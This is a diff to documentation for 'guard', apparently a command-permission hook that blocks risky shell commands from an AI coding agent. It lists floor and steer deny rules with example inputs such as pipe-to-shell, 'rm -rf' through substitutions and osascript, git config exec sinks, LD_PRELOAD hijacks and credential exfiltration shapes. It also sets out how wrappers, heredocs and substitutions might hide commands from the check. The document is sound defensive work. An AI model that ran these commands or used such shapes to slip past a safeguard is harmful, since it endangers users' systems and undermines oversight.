@@ -17,6 +17,199 @@ This doc focuses on the DENY tier and the riskier ASK entries. The ALLOW
 tier is large and uninteresting — read the registry directly if you need
 the full list.
 
+## Auto mode: hard floor vs steering
+
+Every deny rule is either FLOOR or STEER. The split lives in `RULE_TIERS`
+in `src/guard/registry.py`; the tables below mirror it.
+
+- **FLOOR** -- irreversible or catastrophic actions, code injection, hook or
+  guard evasion, supply chain, credential exfiltration, and boundaries Claude
+  Code's auto classifier cannot see (guard's own files, subagent scope, the
+  commit-attribution policy). Denied in every permission mode.
+- **STEER** -- shape and style rules that point the agent at a better route.
+  Denied in every permission mode except Claude Code's `auto`.
+
+In `auto` (and not under `guard mode lockdown`) a STEER match returns no
+decision, so Claude Code's own auto-mode classifier decides, and guard logs a
+`pass` record with the reason `deferred to auto mode (steer rule <key>)`.
+Guard keeps scanning after it skips a STEER match, so a FLOOR rule elsewhere
+in the command still denies. The payload a STEER shape hides is run through
+the floor on its own: a `$(...)` or `<(...)` body, a `bash -c` string, a
+function body, a `trap` handler, a `find -exec` command, and the command an
+`ssh` / container `exec` / `nsenter` runs elsewhere. A substitution is also
+re-checked with `/` in its place, so `rm -rf $(echo /)` still denies. Wrapper
+options are peeled first (`env -i`, `env -u NAME`, `bash -o pipefail -c`,
+`ssh host --`), so a wrapper never hides the command it runs. A `-c` string
+guard cannot read (empty, an `xargs -I{}` placeholder, or a command named by
+an expansion such as `bash -c "$X"`) is denied; `$` in an argument
+(`bash -c 'echo $HOME'`) is fine. awk is checked in every mode: a command in
+`system()`, `print | cmd` or `cmd | getline` that opens with a literal
+(`"wc -l " $1`, or a variable the program assigns one) goes through the floor
+with its run-time parts stood in for by `/` and by an expansion, and one whose
+command word is only known at run time (`system($0)`) is denied.
+
+An inline program written out literally (`python3 -c '...'`, `python3 -
+<<'EOF'`, `node -e` / `--eval` / `-p`, `node --input-type=module < x.mjs`,
+`osascript -e`, `ruby -e`, `perl -e`) is STEER in auto mode under
+`bash.dangerous_interpreter:literal`. A script file (`python3 x.py`) already
+passes, and literal code is no less visible to the auto classifier than a file.
+The program stays FLOOR when it comes from a pipe (`curl ... | python3`), a
+variable or a substitution (`python3 -c "$CODE"`), a here-string, or an
+unquoted heredoc whose body expands. It also stays FLOOR when it evaluates what
+it reads on stdin, which is pipe-to-shell with an extra step: a code sink
+(`exec` / `eval` / `compile` / `os.system`, `eval` / `new Function` / `vm`,
+ruby / perl `eval` / `system`) together with a stdin source (`input()`,
+`sys.stdin`, `open(0)`, `readFileSync(0)`, `STDIN`, `<STDIN>`, or a perl / ruby
+`-n` / `-p` loop). `osascript -e` is checked further: each `do shell script`
+(Terminal's `do script`, iTerm's `write text`, JXA `doShellScript` /
+`doScript`) string literal is floor-checked like a `bash -c` string, as `sudo
+sh -c` when the program asks for administrator privileges. An argument built at
+run time (a variable, a concatenation), `run script` / `load script`, a raw
+Apple event (`«event sysoexec»`), an `NSTask` launch and JXA `eval` / `$.system`
+are denied, since guard can't read what they run. An AppleScript read from a
+heredoc or a file stays FLOOR for the same reason.
+
+Heredoc bodies are data in every mode: a body written to a file or fed to a
+filter (`cat > notes.md <<'EOF'`) is taken out before the command is split into
+lines, so a prose or config line (`at noon`, `[tool.ruff]`, a backtick fence)
+is not read as a command. A body stays commands when the command can run it
+as shell (`bash <<EOF`, `ssh host <<EOF`, `script` or `expect` on the
+heredoc, `xargs` turning its words into a command line, a `cat > x.sh <<EOF`
+followed by `bash x.sh`). A body that is an interpreter's program on stdin
+(`python3 - <<'EOF'`) is that interpreter's code, judged by its own rule, even
+when a shell runs elsewhere in the command. In an unquoted body, `$(...)` and
+backticks still run and are checked.
+
+Every other permission mode, and lockdown in any permission mode, denies on
+both tiers exactly as before. Allowlist overrides behave the same in every
+mode: an allowlisted STEER command is allowed, not deferred.
+
+A key is a rule id, a hook id, or `<rule>:<shape>` when one shape of a rule
+sits on a different tier from the rest. The allowlist id is always the part
+before the colon. A key missing from the table is FLOOR. Pipe-to-shell
+(`curl ... | sh`) carries no rule id and is always FLOOR: a shell or
+interpreter that reads its program from the pipe. A pipe into a script or
+module (`printf '{}' | python3 tool.py`, `cat x.json | python3 -m json.tool`)
+reads stdin as data and is not pipe-to-shell, unless the data comes off the
+network: network output (`curl`, `wget`, `nc` / `ncat`, `socat`, `http`, `xh`,
+`aria2c`, `fetch`, `ssh`, `gh api`, `aws s3 cp ... -`, `gsutil cat`) piped into
+any shell or interpreter, whatever its arguments (`wget -qO- x | python3
+tool.py`), is FLOOR too, as is network output reaching one through a
+substitution (`python3 tool.py < <(curl x)`, `echo "$(curl x)" | python3
+tool.py`). A data-only module (`curl ... | python3 -m json.tool`), a literal
+`-c` / `-e` program with no code sink (`curl ... | python3 -c 'import
+json,sys; print(json.load(sys.stdin))'`) and a non-interpreter (`curl ... | jq
+.`) only parse the output, so they pass.
+
+### FLOOR
+
+| Rule key | Why |
+|---|---|
+| `bash.always_deny` | registry literal; each prefix has its own tier (below) |
+| `bash.admin_forbidden_flag` | cloud CLI flag redirects endpoint, swaps credentials or drops TLS |
+| `bash.admin_forbidden_subcommand` | raw REST / credential-swap subcommand skips the destructive-verb rules |
+| `bash.admin_sensitive_env_override` | inline env redirects a cloud CLI's endpoint or credentials |
+| `bash.aws_destructive` | irreversible cloud resource deletion |
+| `bash.aws_s3_destructive` | irreversible bucket / object deletion |
+| `bash.az_destructive` | irreversible cloud resource deletion |
+| `bash.gcloud_destructive` | irreversible cloud resource deletion |
+| `bash.cargo_remote_install` | supply chain: installs code from an arbitrary remote source |
+| `bash.gem_remote_install` | supply chain: installs code from an arbitrary remote source |
+| `bash.go_remote_install` | supply chain: installs code from an arbitrary remote source |
+| `bash.helm_remote_install` | supply chain: installs charts from an arbitrary remote source |
+| `bash.npm_url_install` | supply chain: installs code from an arbitrary remote source |
+| `bash.npx_remote` | supply chain: runs an arbitrary remote package |
+| `bash.pip_install_url` | supply chain: runs setup code from an arbitrary remote source |
+| `bash.registry_config` | supply chain: repoints every later install at another registry |
+| `bash.chmod_dangerous` | recursive 777 on a system root |
+| `bash.chmod_setuid` | setuid / setgid bit is a privilege-escalation primitive |
+| `bash.chmod_sensitive_target` | opens a credential store to other users |
+| `bash.fs_attr_sensitive` | ownership / immutability change on a credential store |
+| `bash.command_too_long` | past the scan budget no floor rule can be checked |
+| `bash.credential_leak` | prints a credential into the transcript |
+| `bash.secret_value` | literal secret on the command line |
+| `bash.secret_egress` | uploads a credential file |
+| `bash.dns_exfil` | DNS-tunnel exfiltration shape |
+| `bash.dangerous_env_sink` | exec / loader hijack env (`GIT_SSH_COMMAND`, `LD_PRELOAD`, ...) |
+| `bash.dangerous_interpreter` | inline interpreter code |
+| `bash.eval_builtin` | `eval` runs an arbitrary string as code |
+| `bash.dangerous_construct:executed` | output run as code (`bash -c "$(curl ...)"`, `source <(...)`, a shell fed by `<<<`), or awk / osascript running a command built at run time |
+| `bash.dangerous_construct:sensitive_target` | `>` / `>>` / `>|` into `~/.ssh`, a shell rc file, `/etc`, a launch agent, git config or a git hook |
+| `bash.shell_wrapper:opaque` | `-c` string that is empty, a `{}` placeholder or runs a command named by an expansion |
+| `bash.admin_default_deny` | cloud CLI verb off the read-only catalog: secret reads, IAM grants, public access, key minting |
+| `bash.var_expanded_head` | variable-named command (`$R`, `$SHELL`, `$1`, `$@`); what runs is unknowable |
+| `bash.glob_head` | glob in the command name (`/bin/r?`) hides which binary runs |
+| `bash.env_split_string` | `env -S` rebuilds argv guard cannot see |
+| `bash.wrapper_stacking` | nesting past the unwrap limit hides the inner command |
+| `bash.dangerous_rm` | recursive rm of `/`, `~`, `$HOME` or cwd |
+| `bash.function_definition:fork_bomb` | a function whose body pipes into or backgrounds a call back to itself exhausts the process table |
+| `bash.conditional_denied_flag:root` | `find -delete` / `-exec` rooted at `/`, a home dir or a system directory, or an unfiltered delete of `.` or `..` |
+| `bash.disk_destruction` | disk / partition / filesystem destruction |
+| `bash.db_cli_destructive` | irreversible database destruction |
+| `bash.dropdb_or_mysqladmin` | irreversible database destruction |
+| `bash.mongo_destructive` | irreversible database destruction |
+| `bash.iac_destruction` | tears down a whole IaC stack |
+| `bash.kubectl_destructive` | cluster-wide kubectl deletion |
+| `bash.gh_api_destructive` | raw `gh api` mutation (DELETE / PATCH / PUT / graphql mutation) |
+| `bash.gpg_secret_delete` | destroys private key material |
+| `bash.git_force_push` | rewrites shared remote history |
+| `bash.git_force_refspec` | `+refspec` force-push rewrites shared remote history |
+| `bash.git_config_injection` | git config exec sink (`core.hooksPath`, `alias.x=!cmd`, ...) |
+| `bash.git_read_exec` | read-only git verb coerced into exec or an arbitrary file write |
+| `bash.escalation_shell` | `su` / `doas` / `pkexec` shell outside guard's view |
+| `bash.sudo_escalation` | root shell or env transfer outside guard's view |
+| `bash.host_control` | reboot / shutdown kills the session and the host |
+| `bash.kernel_module_load` | loads code into the kernel |
+| `bash.network_policy_wipe` | firewall wipe can lock the operator out |
+| `bash.persistence` | schedules code that outlives the session (cron, launchd, systemd) |
+| `bash.process_attach` | reads another process's memory |
+| `bash.process_tree_kill` | kills every process the user owns |
+| `bash.sensitive_write` | writes to `~/.ssh`, shell rc files, `/etc` or launch agents |
+| `guard.git_c_validator` | an unclassified `git -C` deny fails closed |
+| `guard.git_c_validator:paths_config` | `-c core.hooksPath` / `core.attributesFile` loads hooks from elsewhere |
+| `guard.git_c_validator:read_exec` | read verb coerced into exec or a file write; `fetch --upload-pack` |
+| `guard.protected_files` | guard's trust root, its allowlist and the user's protected list |
+| `guard.credential_check` | credential material in a tool input |
+| `guard.commit_message_validator` | AI-attribution policy the auto classifier cannot know; a pushed trailer needs a history rewrite |
+| `guard.subagent_scope` | declared subagent scope the auto classifier cannot see |
+| `guard.agent_output_guard` | only subagent transcripts deny (background output passes); a transcript floods context |
+
+### STEER
+
+| Rule key | Why |
+|---|---|
+| `bash.admin_unknown_flag_strict` | lockdown-only unknown-flag escalation |
+| `bash.conditional_denied_flag` | `find -exec` / `-delete`, `yq -i` on a project path |
+| `bash.dangerous_construct` | command / process substitution, here-string, file redirect; bodies are still floor-checked |
+| `bash.dangerous_interpreter:literal` | inline program written out literally (`python3 -c '...'`, `python3 - <<'EOF'`, `node -e`, `osascript` / `ruby` / `perl -e`): as visible as a script file, which already passes. A program from a pipe, a variable or a substitution, or one that evals stdin, stays FLOOR; an `osascript` `do shell script` string is floor-checked like `bash -c` |
+| `bash.eval_builtin:source` | `source` / `.` of a file, e.g. loading a `.env` |
+| `bash.exec_wrapper` | the peeled inner command is matched by its own rule |
+| `bash.function_definition` | shell function; the body is still floor-checked |
+| `bash.trap_exploit` | trap handler; the handler body is still floor-checked |
+| `bash.shell_wrapper` | `bash -c` payload is re-split and floor-checked |
+| `bash.remote_shell_wrapper` | `ssh` / container `exec` / `nsenter`; the remote payload is still floor-checked |
+| `bash.git_ref_mutation` | local branch / tag / remote-config write |
+| `bash.git_worktree_add` | `worktree add -b` creates a local branch; a system-root target needs root anyway |
+| `bash.git_submodule_add` | adds a submodule; nothing runs until it is initialized |
+| `bash.tool_alternative` | prefer-a-dedicated-tool nudge |
+| `bash.use_corpus_harness` | guard-checkout workflow nudge |
+| `bash.strict_default_deny` | lockdown-only default deny |
+| `bash.strict_feedback` | lockdown-only feedback deny |
+| `guard.git_c_validator:config_write` | `git -C` config write; exec-sink keys are FLOOR under `bash.git_config_injection` |
+| `guard.git_c_validator:commit_reuse` | `git commit -C` / `--reuse-message` |
+| `guard.git_c_validator:destructive` | `reset` / `clean` under `-C`, which guard does not block without `-C` |
+| `guard.git_c_validator:stash` | `stash pop` / `drop` / `clear` |
+| `guard.git_c_validator:ref_mutation` | local branch / tag / remote-config write |
+| `guard.git_c_validator:not_read_only` | subcommand off the `git -C` read-only list |
+
+`ALWAYS_DENY` literals (`bash.always_deny`) are FLOOR, each with its
+registry reason as the rationale, except these STEER prefixes: `git add -A`,
+`git add --all`, `git add -a`, `git add .`, `git branch -D`, `git remote add`,
+`git remote set-url`, `git remote rename`, `git remote remove`,
+`git remote rm`, `git remote prune`, `git remote update`,
+`git remote set-head`, `git remote set-branches` and `env -i`. Their tier key
+is `bash.always_deny:<prefix>`, e.g. `bash.always_deny:git add -A`.
+
 ## Always-deny
 
 These prefixes are in `ALWAYS_DENY` and block under `enforce` and
@@ -79,7 +272,9 @@ forward-scans past wrapper flags to the wrapped interpreter, so
 `uvx python -c`, `uvx --from pkg python -c`, `pipx run python -c`,
 `uv run python -c`, `uv run python - <<EOF`, and `uv tool run python -c` all
 deny. The deny reason steers the agent to write the code to a script file and
-run that file.
+run that file. In Claude Code's `auto` permission mode a literal program is
+STEER (`bash.dangerous_interpreter:literal`, see above), and the `python -c` /
+`python3 -c` / `node -e` / `node --eval` literals follow it.
 
 Running a script path (`uv run python tools/dev.py`, `python3 scripts/x.py
 --flag`, `node build.js`) or a module (`python -m pytest`, `python -m pip
@@ -121,10 +316,11 @@ These deny on shape, not on a literal registry prefix. A reviewer auditing
 | Dangerous env-var sinks | `_has_dangerous_env_sink` | `GIT_SSH_COMMAND=... git fetch`, `LD_PRELOAD=... cmd`, `DYLD_INSERT_LIBRARIES=... cmd`, `PYTHONPATH=... python` (see `DANGEROUS_ENV_SINKS` in registry.py) |
 | `git -c` config injection | `_is_git_config_injection` | `git -c alias.x='!cmd'`, `git -c core.pager='!rm'`, `git -c core.hooksPath=...`, `git -c core.attributesFile=...` (see `GIT_CONFIG_EXEC_SINKS` / `GIT_CONFIG_EXEC_SINK_GLOBS` in registry.py) |
 | Wrapper-stacking depth > 3 | `_exceeds_unwrap_cap` | `sudo env -i bash -c 'cmd'` (depth 4) |
-| Pipe-to-shell | `_is_pipe_to_shell` | `curl http://x \| bash`, `wget -O- ... \| sh` |
+| Pipe-to-shell | `_is_pipe_to_shell`, `_fetch_to_interpreter` | `curl http://x \| bash`, `wget -O- ... \| sh`, `cat s \| python3 -`, and network output into any shell or interpreter (`wget -qO- x \| python3 tool.py`); a local consumer that runs a script (`\| python3 tool.py`), a data-only module (`curl ... \| python3 -m json.tool`) or a sink-free literal program is not one |
+| osascript shell command | `_osascript_floor` | `osascript -e 'do shell script "rm -rf ~"'` is floor-checked like `bash -c`; `do shell script "ls " & x` (built at run time) denies |
 | Credential leak | `CREDENTIAL_LEAK_PATTERNS` | `gh auth token`, `aws iam create-access-key`, `aws sts get-session-token`, `op read` |
 | Secret value in command text | `get_secret_value_deny` (`bash.secret_value`) | Known key prefixes (`sk-ant-…`, `AKIA…`, `ghp_…`, `glpat-…`, `xox…`, `AIza…`, JWTs, PEM blocks) or a high-entropy assigned value (`TOKEN=<random>`) -- denies in both modes so a literal secret never reaches the shell |
-| Heredoc body feeding a shell/eval sink | `_shell_code_mask` (heredoc handling) | `bash <<EOF\nrm -rf /\nEOF`, `cat <<EOF \| sh` -- write/doc-sink heredoc bodies are masked, but eval/shell-sink bodies stay visible and are re-evaluated |
+| Heredoc body feeding a shell/eval sink | `_heredoc_skeleton`, `_shell_code_mask` | `bash <<EOF\nrm -rf /\nEOF`, `cat <<EOF \| sh` -- data heredoc bodies are taken out before the line split, but a body the command can run as shell stays visible and is re-evaluated |
 | Force-push refspec | `_is_git_force_refspec` | `git push origin +HEAD:main`, `git push origin +refs/heads/main:refs/heads/main` |
 | `git submodule add` | `_is_git_submodule_add` | `git submodule add https://evil/pkg` (fetches arbitrary repo) |
 | `git worktree add <system-path>` | `_is_git_worktree_add` | `git worktree add /etc/passwd HEAD`, `git worktree add -b branch /usr/local/wt HEAD` |
